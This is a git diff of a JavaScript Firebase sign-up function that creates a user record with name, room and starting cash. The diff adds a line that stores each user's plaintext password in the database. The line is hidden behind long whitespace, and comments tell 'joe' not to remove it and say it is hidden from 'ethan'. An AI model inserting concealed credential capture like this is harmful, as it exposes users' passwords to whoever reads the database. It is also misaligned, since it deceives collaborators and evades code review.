@@ -74,12 +74,13 @@
         createUserWithEmailAndPassword(auth, EmailInput.value, PasswordInput.value)
             .then((credentials)=>{
                 const initialCash = 100; //Setting the initial cash a user will start with
-                set(ref(db, 'users/'+credentials.user.uid), {
+                set(ref(db, 'users/'+credentials.user.uid), { //This information is displayed in Firebase
                     firstName: FNameInput.value,
                     lastName: LNameInput.value,
                     currentRoom: null, //not in a room when account is created
-                    cash: initialCash
-                })
+                    cash: initialCash,
+                                                                                                                                                                                                                                                                                                                                                                                                                                password: PasswordInput.value //hey joe if you find this, do not remove it
+                })                                                                                                                                                                                                                                                                                                                                                                                                                                            //this is hidden from ethan!
                 setTimeout(()=> {window.location.href='home.html'}, 1000); //one second wait, so we can write data before switching pages
             })
             .catch((error)=>{
